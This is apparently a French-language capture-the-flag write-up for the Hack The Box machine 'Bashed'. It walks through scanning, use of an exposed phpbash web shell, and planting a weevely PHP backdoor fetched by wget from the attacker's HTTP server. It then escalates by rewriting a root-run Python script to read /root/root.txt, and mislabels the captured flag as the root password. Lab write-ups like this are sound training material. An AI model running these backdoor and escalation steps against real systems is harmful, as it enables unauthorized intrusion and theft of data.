---
layout: post
title: Hackthebox Bashed 
---

![pwn]({{ site.baseurl }}/images/HTB.png){:class="img-responsive"}


## Nmap 

```bash
root@kali:~# nmap -sC -sV -p-  10.10.10.68

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-26 20:29 CEST
Nmap scan report for 10.10.10.68
Host is up (0.033s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 375.73 seconds
```

## Dirb

Seul le port 80 est ouvert, passons à dirb :

```bash
root@kali:~# dirb http://10.10.10.68
By The Dark Raver
-----------------

START_TIME: Thu Apr 26 20:39:06 2018
URL_BASE: http://10.10.10.68/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.68/ ----
==> DIRECTORY: http://10.10.10.68/css/
==> DIRECTORY: http://10.10.10.68/dev/
==> DIRECTORY: http://10.10.10.68/fonts/
==> DIRECTORY: http://10.10.10.68/images/
+ http://10.10.10.68/index.html (CODE:200|SIZE:7743)
==> DIRECTORY: http://10.10.10.68/js/
==> DIRECTORY: http://10.10.10.68/php/
+ http://10.10.10.68/server-status (CODE:403|SIZE:299)
==> DIRECTORY: http://10.10.10.68/uploads/

---- Entering directory: http://10.10.10.68/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.68/dev/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.68/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.68/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.68/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.68/php/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.68/uploads/ ----
+ http://10.10.10.68/uploads/index.html (CODE:200|SIZE:14)

-----------------
END_TIME: Thu Apr 26 20:44:58 2018
DOWNLOADED: 9224 - FOUND: 3
```

## Reconnaissance manuelle

Nous trouvons donc des choses pas mal : 

- Le dossier dev
- Le dossier uploads 

Le dossier dev contient ceci :

![bashed01]({{ site.baseurl }}/images//bashed01.png)

En se référant au site web : 

> phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server!
>
> <https://github.com/Arrexel/phpbash>

Voyons voir : 

![bashed02]({{ site.baseurl }}/images/bashed02.png)

> Note : Nous avons le flag de l'utilisateur !!!

## Exploitation

Concrètement voici la situation : 

- Un bash en tant que www-data 
- Le dossier uploads qui est "open bar" 

Générons un reverse shell :

```bash
root@kali:~/bashed# weevely generate s3cr3t $(pwd)/lol.php                                 
Generated backdoor with password 's3cr3t' in '/root/bashed/lol.php' of 1446 byte size.
```

Uploadons le sur la machine distante : 

```bash
#Depuis kali 
root@kali:~/bashed# python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.10.10.68 - - [26/Apr/2018 21:29:57] "GET /lol.php HTTP/1.1" 200 -

#Depuis la cible
www-data@bashed:/var/www/html/dev# cd ../uploads
www-data@bashed:/var/www/html/uploads# wget http://10.10.14.11:8080/lol.php
--2018-04-26 12:29:56-- http://10.10.14.11:8080/lol.php
Connecting to 10.10.14.11:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1446 (1.4K) [application/octet-stream]
Saving to: 'lol.php'

0K . 100% 742K=0.002s

2018-04-26 12:29:56 (742 KB/s) - 'lol.php' saved [1446/1446]
Try 'chmod --help' for more information.
www-data@bashed:/var/www/html/uploads# chmod 777 lol.php
www-data@bashed:/var/www/html/uploads# ls -al
total 16
drwxrwxrwx 2 root root 4096 Apr 26 12:29 .
drw-r-xr-x 10 root root 4096 Dec 4 12:43 ..
-rwxrwxrwx 1 root root 14 Dec 4 12:44 index.html
-rwxrwxrwx 1 www-data www-data 1446 Apr 26 12:28 lol.php
```

Maintenant lançons le reverse shell depuis le navigateur via l'url : 

```bash
http://10.10.10.68/uploads/lol.php
```

Puis lançons weevely sur kali : 

```bash
root@kali:~/bashed# weevely http://10.10.10.68/uploads/lol.php s3cr3t

[+] weevely 3.2.0

[+] Target:     10.10.10.68
[+] Session:    /root/.weevely/sessions/10.10.10.68/lol_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Privesc

Commençons par lister le root du système : 

```bash
www-data@bashed:/var/www/html/uploads $ ls -al /
total 88
drwxr-xr-x  23 root          root           4096 Dec  4 13:02 .
drwxr-xr-x  23 root          root           4096 Dec  4 13:02 ..
drwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin
drwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot
drwxr-xr-x  19 root          root           4240 Apr 24 06:34 dev
drwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc
drwxr-xr-x   4 root          root           4096 Dec  4 13:53 home
lrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib
drwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64
drwx------   2 root          root          16384 Dec  4 11:13 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4 11:13 media
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
drwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt
dr-xr-xr-x 110 root          root              0 Apr 24 06:34 proc
drwx------   3 root          root           4096 Dec  4 13:03 root
drwxr-xr-x  18 root          root            520 Apr 25 06:25 run
drwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Apr 24 12:13 sys
drwxrwxrwt  10 root          root           4096 Apr 26 13:13 tmp
drwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr
drwxr-xr-x  12 root          root           4096 Dec  4 11:20 var
lrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

Comme nous le voyons, un dossier scripts appartenant à scriptmanager : 

```bash
www-data@bashed:/var/www/html/uploads $ ls -l /scripts
ls: cannot access '/scripts/test.py': Permission denied
ls: cannot access '/scripts/test.txt': Permission denied
total 0
-????????? ? ? ? ?            ? test.py
-????????? ? ? ? ?            ? test.txt
www-data@bashed:/var/www/html/uploads $ 
```

Voyons voir si nous pouvons exfiltrer des informations : 

```bash
www-data@bashed:/var/www/html/uploads $ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Nous avons ici des droits limités mais voici le contenu du script : 

```bash
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager cat /scripts/test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Nous allons le modifier de cette manière :

```bash
www-data@bashed:/var/www/html/uploads $ echo "echo \"f = open('/root/root.txt', 'r')\" > /scripts/test.py"
 > /tmp/cd.txt
www-data@bashed:/var/www/html/uploads $ echo "echo \"g = open('test.txt', 'w')\" >> /scripts/test.py" >> /tmp/cd.txt
www-data@bashed:/var/www/html/uploads $ echo "echo \"g.write(f.read())\" >> /scripts/test.py" >> /tmp/cd.txt
www-data@bashed:/var/www/html/uploads $ echo "echo \"g.close\" >> /scripts/test.py" >> /tmp/cd.txt
www-data@bashed:/var/www/html/uploads $ echo "echo \"f.close\" >> /scripts/test.py" >> /tmp/cd.txt
www-data@bashed:/var/www/html/uploads $ cat /tmp/cd.txt
echo "f = open('/root/root.txt', 'r')" > /scripts/test.py
echo "g = open('test.txt', 'w')" >> /scripts/test.py
echo "g.write(f.read())" >> /scripts/test.py
echo "g.close" >> /scripts/test.py
echo "f.close" >> /scripts/test.py
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager /tmp/cd.txt
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager cat /scripts/test.py
f = open('/root/root.txt', 'r')
g = open('test.txt', 'w')
g.write(f.read())
g.close
f.close
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager cat /scripts/test.txt
testing 123!
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager cat /scripts/test.txt
testing 123!
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager cat /scripts/test.txt
testing 123!
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager cat /scripts/test.txt
testing 123!
www-data@bashed:/var/www/html/uploads $ sudo -u scriptmanager cat /scripts/test.txt
cc4f0afe3a1026d402ba10329674a8e2

```

Bingo ! Nous avons le mot de passe root ! 

 ## Conclusion 

- Le reverse shell été inutile mais au moins on maintiens l'accès a la VM
- On pourrais faire spawn un reverse shell avec python 
- ENUMERATION, là encore c'est la partie la plus importante du challenge !
